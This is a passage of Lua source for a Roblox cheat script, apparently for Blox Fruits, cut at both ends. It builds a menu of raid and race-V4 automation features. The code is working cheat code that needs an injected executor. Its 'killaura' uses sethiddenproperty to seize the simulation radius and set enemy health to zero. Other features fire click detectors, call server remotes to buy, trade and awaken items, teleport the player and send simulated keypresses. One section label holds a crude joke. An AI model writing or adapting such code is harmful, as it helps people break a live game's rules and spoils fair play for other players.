                        LP.Character.Head:FindFirstChild("BodyVelocity"):Destroy()
                    end
                end)
            end)
        end)
        -- killaura
        SelectedChip = "Flame"
        local KillauraRadius = 700
        Killaura = RaidSection:NewToggle("Killaura [ONLY WHILE RAID]", "Killaura", function(state)
            getgenv().Settings["killaura"] = state
            WriteSettings()
        end)
        if getgenv().Settings["killaura"] then Killaura:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["killaura"] then
                        if LP.PlayerGui.Main.Timer.Visible == true then
                            for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and LP.Character:FindFirstChild("HumanoidRootPart") and (LP.Character.HumanoidRootPart.CFrame.Position - v.HumanoidRootPart.CFrame.Position).Magnitude < KillauraRadius then
                                    pcall(function()
                                        repeat task.wait()
                                            sethiddenproperty(LP, "SimulationRadius", math.huge)
                                            v.Humanoid.Health = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            v.HumanoidRootPart.Size = Vector3.new(100,100,100)
                                            v.HumanoidRootPart.Transparency = 0.95
                                        until not getgenv().Settings["killaura"] or not v.Parent or v.Humanoid.Health <= 0 or not LP.Character:FindFirstChild("HumanoidRootPart") or (LP.Character.HumanoidRootPart.CFrame.Position - v.HumanoidRootPart.CFrame.Position).Magnitude > KillauraRadius
                                    end)
                                end
                            end
                        end
                    end
                end)
            end
        end)
        RaidSection:NewSlider("Killaura Radius", "Killaura", 1, 20, function(count)
            KillauraRadius = count * 35
        end)
        autonextisland = RaidSection:NewToggle("Auto Next Island [ONLY WHILE RAID]", "Auto Next Island", function(state)
            getgenv().Settings["autonextisland"] = state
            WriteSettings()
        end)
        if getgenv().Settings["autonextisland"] then autonextisland:UpdateToggle(nil, true) end
        function isIslandNearest()
            islands = {"Island 5", "Island 4", "Island 3", "Island 2", "Island 1"}
            for i,islandName in pairs(islands) do
                for i,v in pairs(game.Workspace._WorldOrigin.Locations:GetChildren()) do
                    if v.Name == islandName then
                        if (LP.Character.HumanoidRootPart.Position - v.Position).Magnitude <= 5000 then
                            return true
                        end
                    end
                end
            end
            return false
        end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["autonextisland"] then
                        islands = {"Island 5", "Island 4", "Island 3", "Island 2", "Island 1"}
                        if LP.PlayerGui.Main.Timer.Visible == true then
                            NoClip = true
                            found = false
                            for i,islandName in pairs(islands) do
                                for i,v in pairs(game.Workspace._WorldOrigin.Locations:GetChildren()) do
                                    if v.Name == islandName then
                                        if (LP.Character.HumanoidRootPart.Position - v.Position).Magnitude <= 5000 then
                                            toPoint(CFrame.new(v.CFrame.X, 45, v.CFrame.Z))
                                            found = true
                                            break
                                        end
                                    end
                                end
                                if found then break end
                            end
                        else
                            NoClip = false
                        end
                    else
                        NoClip = false
                    end
                end)
            end
        end)
        autostartraid = RaidSection:NewToggle("Auto Start Raid", "Auto Start Raid", function(state)
            getgenv().Settings["autostartraid"] = state
            WriteSettings()
        end)
        if getgenv().Settings["autostartraid"] then autostartraid:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["autostartraid"] then
                        curFrag = LP.Data.Fragments.Value
                        if LP.PlayerGui.Main.Timer.Visible or isIslandNearest() then curFrag = curFrag + 1000 end
                        if not getgenv().Settings["enabledmaxfrag"] or curFrag < getgenv().Settings["maxfrag"] then
                            if LP.Backpack:FindFirstChild("Special Microchip") and not isIslandNearest() then
                                if second_sea then
                                    buttonPos = Vector3.new(-6488.0185546875, 248.6365203857422, -4527.62158203125)
                                    for i, child in pairs(game:GetService("Workspace").Map.CircleIsland:GetChildren()) do
                                        if child.Name == "RaidSummon2" then
                                            if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                                                fireclickdetector(child.Button.Main.ClickDetector) 
                                            end
                                        end
                                    end
                                end
                                if third_sea then
                                    buttonPos = Vector3.new(-5006.56641, 322.691223, -2983.73389)
                                    for i, child in pairs(game:GetService("Workspace").Map["Boat Castle"]:GetChildren()) do
                                        if child.Name == "RaidSummon2" then
                                            if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                                                fireclickdetector(child.Button.Main.ClickDetector) 
                                            end
                                        end
                                    end
                                end
                                task.wait(10)
                            end
                        end
                    end
                end)
            end
        end)
        autobuychip = RaidSection:NewToggle("Auto Buy Chip", "Auto Buy Chip", function(state)
            getgenv().Settings["autobuychip"] = state
            WriteSettings()
        end)
        if getgenv().Settings["autobuychip"] then autobuychip:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["autobuychip"] and not LP.PlayerGui.Main.Timer.Visible and not isIslandNearest() then
                        if isWeaponInInventory("Special Microchip") then curFrag = curFrag + 1000 end
                        if LP.PlayerGui.Main.Timer.Visible or isIslandNearest() then curFrag = curFrag + 1000 end
                        if not getgenv().Settings["enabledmaxfrag"] or curFrag < getgenv().Settings["maxfrag"] then
                            task.wait(2)
                            if getgenv().Settings["autobuychip"] then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Check")
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", SelectedChip)
                            end
                        end
                    end
                end)
            end
        end)
        autotradejunk = RaidSection:NewToggle("Auto Trade Fruit < 1M", "Auto Trade Fruit < 1M", function(state)
            getgenv().Settings["autotradejunk"] = state
            WriteSettings()
        end)
        if getgenv().Settings["autotradejunk"] then autotradejunk:UpdateToggle(nil, true) end
        function getCheapestFruit()
            fruits = {
                "Rocket-Rocket",
                "Spin-Spin",
                "Chop-Chop",
                "Spring-Spring",
                "Bomb-Bomb",
                "Smoke-Smoke",
                "Spike-Spike",
                "Flame-Flame",
                "Falcon-Falcon",
                "Ice-Ice",
                "Sand-Sand",
                "Dark-Dark",
                "Diamond-Diamond",
                "Light-Light",
                "Rubber-Rubber",
                "Barrier-Barrier",
                "Ghost-Ghost",
                "Magma-Magma"
            }
            myFruits = {}
            for i,v in pairs(ReplicatedStorage.Remotes["CommF_"]:InvokeServer("getInventoryFruits")) do
                table.insert(myFruits, v.Name)
            end
            for _, fr in pairs(fruits) do
                for _, f in pairs(myFruits) do
                    if fr == f then return fr end
                end
            end
            return 0
        end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    task.wait(5)
                    if getgenv().Settings["autotradejunk"] then
                        if isWeaponInInventory("Special Microchip") then curFrag = curFrag + 1000 end
                        if LP.PlayerGui.Main.Timer.Visible or isIslandNearest() then curFrag = curFrag + 1000 end
                        if not getgenv().Settings["enabledmaxfrag"] or curFrag < getgenv().Settings["maxfrag"] then
                            if not LP.Backpack:FindFirstChild("Special Microchip") then
                                cheapest = getCheapestFruit()
                                if cheapest ~= 0 then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadFruit", cheapest)
                                end
                            end
                        end
                    end
                end)
            end
        end)
        autoawakefruit = RaidSection:NewToggle("Auto Awake Fruit", "Auto Awake Fruit", function(state)
            getgenv().Settings["autoawakefruit"] = state
            WriteSettings()
        end)
        if getgenv().Settings["autoawakefruit"] then autoawakefruit:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    task.wait(1)
                    if getgenv().Settings["autoawakefruit"] then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Check")
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Awaken")
                    end
                end)
            end
        end)
        RaidSection:NewSlider("Max FRAG", "Max Fragments", 0, 20000, function(s) -- 500 (MaxValue) | 0 (MinValue)
            getgenv().Settings["maxfrag"] = s
            WriteSettings()
        end)
        RaidSection:NewToggle("Enable Max Fragments", "Enable Max Fragments", function(state)
            getgenv().Settings["enabledmaxfrag"] = state
            WriteSettings()
        end)


        
        chipRaidLabel = RaidSection:NewLabel("Selected Chip: " .. SelectedChip)
        RaidSection:NewDropdown("Select Chip", "Select Chip", {"Flame","Ice","Dough","Buddha","Magma","Quake","Light","Dark","Spider","Rumble","Sand","Phoenix"}, function(chip)
            SelectedChip = chip
            chipRaidLabel:UpdateLabel("Selected Chip: " .. SelectedChip)
        end)
        RaidSection:NewButton("Buy Selected Chip", "Buy Selected Chip", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Check")
            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", SelectedChip)
        end)
        RaidSection:NewButton("Start Left Side Raid", "Start Left Side Raid", function()
            if second_sea then
                buttonPos = Vector3.new(-6488.0185546875, 248.6365203857422, -4527.62158203125)
                for i, child in pairs(game:GetService("Workspace").Map.CircleIsland:GetChildren()) do
                    if child.Name == "RaidSummon2" then
                        if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                            fireclickdetector(child.Button.Main.ClickDetector) 
                        end
                    end
                end
            end
            if third_sea then
                buttonPos = Vector3.new(-5094.7915, 322.691223, -2948.08862)
                for i, child in pairs(game:GetService("Workspace").Map["Boat Castle"]:GetChildren()) do
                    if child.Name == "RaidSummon2" then
                        if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                            fireclickdetector(child.Button.Main.ClickDetector) 
                        end
                    end
                end
            end
        end)
        RaidSection:NewButton("Start Right Side Raid", "Start Right Side Raid", function()
            if second_sea then
                buttonPos = Vector3.new(-6465.17138671875, 248.6365203857422, -4452.00048828125)
                for i, child in pairs(game:GetService("Workspace").Map.CircleIsland:GetChildren()) do
                    if child.Name == "RaidSummon2" then
                        if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                            fireclickdetector(child.Button.Main.ClickDetector) 
                        end
                    end
                end
            end
            if third_sea then
                buttonPos = Vector3.new(-5006.56641, 322.691223, -2983.73389)
                for i, child in pairs(game:GetService("Workspace").Map["Boat Castle"]:GetChildren()) do
                    if child.Name == "RaidSummon2" then
                        if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                            fireclickdetector(child.Button.Main.ClickDetector) 
                        end
                    end
                end
            end
        end)
        RaidSection:NewLabel(" ")
        RaidSection:NewButton("Tween to raid room", "Tween to raid room", function()
            if second_sea then
                cf = CFrame.new(-6451.38721, 249.528275, -4494.57324, -0.642593145, 2.36225439e-09, 0.766207576, 1.03323057e-08, 1, 5.58231772e-09, -0.766207576, 1.15038503e-08, -0.642593145)
                StoppedTween = false
                repeat wait()
                    NoClip = true
                    useNearestEntrance(cf)
                    toPoint(cf)
                until (LP.Character.HumanoidRootPart.CFrame.Position - cf.Position).Magnitude < 20 or StoppedTween
                NoClip = false
            end
        end)
        
        local RaceTab = Window:NewTab("Race")
        local BlueGearSection = RaceTab:NewSection("Blue Gear üò∞üíôü•∂üîµ‚öôÔ∏è ( penis :3 )")
        DialogueStatus = BlueGearSection:NewLabel("Dialog Status: ")
        spawn(function()
            while wait(20) do
                pcall(function()
                    check = ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Check")
                    if check == 1 then
                        DialogueStatus:UpdateLabel("Dialog Status: 1/4 ‚ùå")
                    elseif check == 2 then
                        DialogueStatus:UpdateLabel("Dialog Status: 2/4 ‚ùå")
                    elseif check == 3 then
                        DialogueStatus:UpdateLabel("Dialog Status: 3/4 ‚ùå")
                    elseif check == 4 then
                        DialogueStatus:UpdateLabel("Dialog Status: Ready for get Blue Gear ‚úÖ")
                    end
                end)
            end
        end)
        
        
        BlueGear = BlueGearSection:NewLabel("Blue Gear: ")
        spawn(function()
            while wait(20) do
                pcall(function()
                    if ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then
                        BlueGear:UpdateLabel("Blue Gear: ‚úÖ")
                    else
                        BlueGear:UpdateLabel("Blue Gear: ‚ùå")
                    end
                end)
            end
        end)
        MirageIsland = BlueGearSection:NewLabel("Mirage Spawned: ")
        MirageIslandDistance = BlueGearSection:NewLabel("Mirage Distance: ")
        AutoLockMoon = BlueGearSection:NewToggle("Auto Lock Moon", "Auto Lock Moon", function(state)
            getgenv().Settings["Auto Lock Moon"] = state
            WriteSettings()
        end)
        if getgenv().Settings["Auto Lock Moon"] then AutoLockMoon:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().Settings["Auto Lock Moon"] and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then _G.AutoLockMoon = true else _G.AutoLockMoon = false end
                end)
            end
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    if _G.AutoLockMoon then
                        workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position,game:GetService("Lighting"):GetMoonDirection() + workspace.CurrentCamera.CFrame.Position)
                    end                
                end)
            end
        end)
        spawn(function()
            while wait() do
                pcall(function()
                    if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                        MirageIsland:UpdateLabel("Mirage Spawned: üü¢")
                    else
                        MirageIsland:UpdateLabel("Mirage Spawned: üî¥")
                    end
                end)
            end
        end)
        spawn(function()
            while wait() do
                pcall(function()
                    if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                        MirageIslandDistance:UpdateLabel("Mirage Distance: " .. tostring(math.floor(getDistance(CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z)))) .. "m (" .. tostring(math.floor(getDistance(CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z)) / 220)) .. " +- seconds)")
                    else
                        MirageIslandDistance:UpdateLabel("Mirage Distance: Not Spawned")
                    end
                end)
            end
        end)
        
        TweenToMirage = BlueGearSection:NewToggle("Tween to Mirage [ if exists ]", "Tween to Mirage [ if exists ]", function(state)
            getgenv().Settings["Tween to mirage"] = state
            WriteSettings()
        end)
        if getgenv().Settings["Tween to mirage"] then TweenToMirage:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().Settings["Tween to mirage"] and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then _G.TweenToMirage = true else _G.TweenToMirage = false end
                end)
            end
        end)
        spawn(function()
            while wait() do
                pcall(function()
                    if _G.TweenToMirage then
                        StopTween()
                        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                            repeat wait()
                                toPoint(CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z))
                            until not game:GetService("Workspace").Map:FindFirstChild("MysticIsland") or not _G.TweenToMirage
                        end
                    end
                end)
            end
        end)

        TweenToGear = BlueGearSection:NewToggle("Tween to Gear", "Tween to Gear", function(state)
            getgenv().Settings["Tween to Gear"] = state
            WriteSettings()
        end)
        if getgenv().Settings["Tween to Gear"] then TweenToGear:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().Settings["Tween to Gear"] and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then _G.TweenToGear = true else _G.TweenToGear = false end
                end)
            end
        end)
        spawn(function()
            pcall(function()
                while wait() do
                    if _G.TweenToGear then
                        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                            for i,v in pairs(game:GetService("Workspace").Map.MysticIsland:GetChildren()) do 
                                if v:IsA("MeshPart")then 
                                    if v.Material == Enum.Material.Neon then  
                                        toPoint(v.CFrame)
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        end)

        AutoGear = BlueGearSection:NewToggle("Auto Blue Gear [ BETA TEST ]", "Auto Blue Gear", function(state)
            getgenv().Settings["Auto Gear"] = state
            WriteSettings()
        end)
        if getgenv().Settings["Auto Gear"] then AutoGear:UpdateToggle(nil, true) end
        AutoHopIfNoMirage = BlueGearSection:NewToggle("Auto Hop If No Mirage", "Auto Hop If No Mirage", function(state)
            getgenv().Settings["Auto Hop If No Mirage"] = state
            WriteSettings()
        end)
        if getgenv().Settings["Auto Hop If No Mirage"] then AutoHopIfNoMirage:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().Settings["Auto Hop If No Mirage"] then 
                        _G.AutoHopIfNoMirage = true 
                    else 
                        _G.AutoHopIfNoMirage = false 
                    end
                end)
            end
        end)

        function IsPosisbleToDoMirage()
            if not game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then return false end
            timeForMirage = math.floor(getDistance(CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z)) / 220)
            time = game:GetService("Lighting").ClockTime
            if time >= 17.5 - (timeForMirage / 60) or time < 4.8 - (timeForMirage / 60) then
                return true
            else
                return false
            end
        end

        function IsNight()
            time = game:GetService("Lighting").ClockTime
            if time >= 18 then
                return true
            end
            if time < 5 then
                return true
            end
            return false
        end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().Settings["Auto Gear"] then 
                        _G.AutoGear = true 
                    else 
                        _G.AutoGear = false 
                    end
                end)
            end
        end)
        spawn(function()
            while wait() do
                pcall(function()
                    if GetMaterial("Mirror Fractal") == 0 or not isWeaponInInventory("Valkyrie Helm") then
                        return
                    end
                    if ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then
                        return
                    end
                    if getgenv().Settings["Auto Gear"] and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Check")) ~= 4 and GetMaterial("Mirror Fractal") > 0 and isWeaponInInventory("Valkyrie Helm") then
                        if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Check")) == 1 then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Begin")
                        end
                        if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Check")) == 2 then
                            repeat wait()
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                                wait(2)
                                repeat wait()
                                    toPoint(CFrame.new(28609.8984, 14896.5322, 106.336395, 0.0235749353, -9.18887295e-08, -0.999722064, 4.15164472e-08, 1, -9.09352522e-08, 0.999722064, -3.93611153e-08, 0.0235749353))
                                until getDistance(CFrame.new(28609.8984, 14896.5322, 106.336395, 0.0235749353, -9.18887295e-08, -0.999722064, 4.15164472e-08, 1, -9.09352522e-08, 0.999722064, -3.93611153e-08, 0.0235749353)) < 20
                                wait(1)
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","TeleportBack")
                                wait(.5)
                                toPoint(CFrame.new(2956.01245, 2282.23022, -7215.73926, 0.526488245, -3.62312811e-08, -0.850182414, -4.38758612e-08, 1, -6.97866724e-08, 0.850182414, 7.40443511e-08, 0.526488245))
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Teleport")
                            until tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Check")) ~= 2 or not _G.AutoGear
                        end
                        if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Check")) == 3 then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Continue")
                        end
                    end
                    if _G.AutoGear then
                        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") and IsPosisbleToDoMirage() and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Check")) == 4 then
                            repeat wait()
                                MiragePoint = CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z)
                                if useNearestEntrance(MiragePoint) then
                                    StopTween()
                                end
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                toPoint(MiragePoint)
                                gearFound = false
                                for i,v in pairs(game:GetService("Workspace").Map.MysticIsland:GetChildren()) do 
                                    if v:IsA("MeshPart")then 
                                        if v.Material == Enum.Material.Neon and v.Transparency == 0 then  
                                            gearFound = v
                                        end
                                    end
                                end
                                if not gearFound then
                                    if getDistance(MiragePoint) < 200 and IsNight() then
                                        workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position,game:GetService("Lighting"):GetMoonDirection() + workspace.CurrentCamera.CFrame.Position)
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "T", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "T", false, game)
                                    end
                                else
                                    repeat wait()
                                        toPoint(gearFound.CFrame)
                                    until not gearFound or not gearFound.Parent or gearFound.Transparency == 1 or not _G.AutoGear
                                end
                            until not game:GetService("Workspace").Map:FindFirstChild("MysticIsland") or not _G.AutoGear
                        else
                            if getDistance(CFrame.new(-16220.6738, 28.6496544, 447.947723)) > 100 then 
                                toPoint(CFrame.new(-16220.6738, 28.6496544, 447.947723))
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            else
                                if _G.AutoHopIfNoMirage then
                                    if not game:GetService("Workspace").Map:FindFirstChild("MysticIsland") and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Check")) == 4 then
                                        wait(5)
                                        HopServer()
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end)

        local RaceV4Section = RaceTab:NewSection("Race V4")
        RaceV4Section:NewButton("Teleport to Temple of Time", "Teleport to Temple of Time", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
        end)
        RaceV4Section:NewButton("Teleport to Lever and pull", "Teleport to Lever", function()
            if LP.Character.Humanoid.Health <= 0 then return end
            if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 3000 then
                ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
            end
            repeat wait()
                toPoint(CFrame.new(28577.2402, 14938.8594, 71.3184814, -0.0580973662, -4.90787393e-08, -0.998310924, 5.58289548e-09, 1, -4.94866761e-08, 0.998310924, -8.44851122e-09, -0.0580973662))
            until LP.Character.Humanoid.Health <= 0 or getDistance(CFrame.new(28577.2402, 14937.8594, 71.3184814, -0.0580973662, -4.90787393e-08, -0.998310924, 5.58289548e-09, 1, -4.94866761e-08, 0.998310924, -8.44851122e-09, -0.0580973662)) < 20
            wait(1)
            if getDistance(CFrame.new(28577.2402, 14938.8594, 71.3184814, -0.0580973662, -4.90787393e-08, -0.998310924, 5.58289548e-09, 1, -4.94866761e-08, 0.998310924, -8.44851122e-09, -0.0580973662)) < 20 then
                game:service('VirtualInputManager'):SendKeyEvent(true, "E", false, game)
                wait(3)
                game:service('VirtualInputManager'):SendKeyEvent(false, "E", false, game)
            end
        end)

        RaceV4Section:NewButton("Teleport Trial Door", "Teleport Trial Door",function()
            if LP.Data.Race.Value == "Fishman" then
                if LP.Character.Humanoid.Health <= 0 then return end
                if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 3000 then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                end
                toPoint(CFrame.new(28224.056640625, 14889.4267578125, -210.5872039794922))
            elseif LP.Data.Race.Value == "Human" then
                if LP.Character.Humanoid.Health <= 0 then return end
                if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 3000 then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                end
                toPoint(CFrame.new(29237.294921875, 14889.4267578125, -206.94955444335938))
            elseif LP.Data.Race.Value == "Cyborg" then
                if LP.Character.Humanoid.Health <= 0 then return end
                if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 3000 then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                end
                toPoint(CFrame.new(28492.4140625, 14894.4267578125, -422.1100158691406))
            elseif LP.Data.Race.Value == "Skypiea" then
                if LP.Character.Humanoid.Health <= 0 then return end
                if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 3000 then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                end
                toPoint(CFrame.new(28967.408203125, 14918.0751953125, 234.31198120117188))
            elseif LP.Data.Race.Value == "Ghoul" then
                if LP.Character.Humanoid.Health <= 0 then return end
                if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 3000 then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                end
                toPoint(CFrame.new(28672.720703125, 14889.1279296875, 454.5961608886719))
            elseif LP.Data.Race.Value == "Mink" then
                if LP.Character.Humanoid.Health <= 0 then return end
                if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 3000 then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                end
                toPoint(CFrame.new(29020.66015625, 14889.4267578125, -379.2682800292969))
            end
        end)
        

        AutoTrial = RaceV4Section:NewToggle("Auto Trial", "Auto Trial", function(state)
            getgenv().Settings["Auto Trial"] = state
            WriteSettings()
        end)
        spawn(function()
            pcall(function()
                while wait() do
                    if getgenv().Settings["Auto Trial"] then _G.AutoTrial = true else _G.AutoTrial = false end
                end
            end)
        end)
        spawn(function()
            pcall(function()
                while wait() do
                    if _G.AutoTrial and LP.PlayerGui.Main.Timer.Visible == true then
                        if LP.Data.Race.Value == "Human" then
                            for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    pcall(function()
                                        repeat wait(.1)
                                            v.Humanoid.Health = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            sethiddenproperty(LP, "SimulationRadius", math.huge)
                                        until not _G.AutoTrial or not v.Parent or v.Humanoid.Health <= 0
                                    end)
                                end
                            end
                        elseif LP.Data.Race.Value == "Skypiea" then
                            for i,v in pairs(game:GetService("Workspace").Map.SkyTrial.Model:GetDescendants()) do
                                if v.Name == "snowisland_Cylinder.081" then
                                    if getDistance(v.CFrame) < 5000 then
                                        toPoint(v.CFrame)
                                    end
                                end
                            end
                        elseif LP.Data.Race.Value == "Fishman" then
                            Fishman_Vstan_Mid = "xD"
                        elseif LP.Data.Race.Value == "Cyborg" then
                            if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 5000 then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                            end
                        elseif LP.Data.Race.Value == "Ghoul" then
                            for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    pcall(function()
                                        repeat wait(.1)
                                            v.Humanoid.Health = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            sethiddenproperty(LP, "SimulationRadius", math.huge)
                                        until not _G.AutoTrial or not v.Parent or v.Humanoid.Health <= 0
                                    end)
                                end
                            end
                        elseif LP.Data.Race.Value == "Mink" then
                            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                                if v.Name == "StartPoint" and getDistance(v.CFrame) < 2000 then
                                    toPoint(v.CFrame * CFrame.new(0,10,0))
                                end
                            end
                        end
                    end
                end
            end)
        end)
        function CheckAcientOneStatus()
            if not LP.Character:FindFirstChild("RaceTransformed") then
                return "You have yet to achieve greatness"
            end
            local v227 = nil
            local v228 = nil
            local v229 = nil
            v229, v228, v227 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Check")
            if v229 == 1 then
                return "Required Train More"
            elseif v229 == 2 or v229 == 4 or v229 == 7 then
                return "Can Buy Gear With " .. v227 .. " Fragments"
            elseif v229 == 3 then
                return "Required Train More"
            elseif v229 == 5 then
                return "You Are Done Your Race."
            elseif v229 == 6 then
                return "Upgrades completed: " .. v228 - 2 .. "/3, Need Trains More"
            end
            if v229 ~= 8 then
                if v229 == 0 then
                    return "Ready For Trial"
                else
                    return "You have yet to achieve greatness"
                end
            end
            return "Remaining " .. 10 - v228 .. " training sessions."
        end
        v4Status = RaceV4Section:NewLabel("Upgrade V4 Status: ")
        spawn(function()
            while wait() do
                pcall(function()
                    v4Status:UpdateLabel("Upgrade V4 Status: " .. CheckAcientOneStatus())
                end)
            end
        end)
        RaceV4Section:NewButton("Buy Ancient One Quest","Buy Ancient One Quest",function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer('UpgradeRace','Buy')
        end)
        SpamAWK = RaceV4Section:NewToggle("Spam Awakening Skill", "Spam Awakening Skill", function(state)
            getgenv().Settings["Spam AWK"] = state
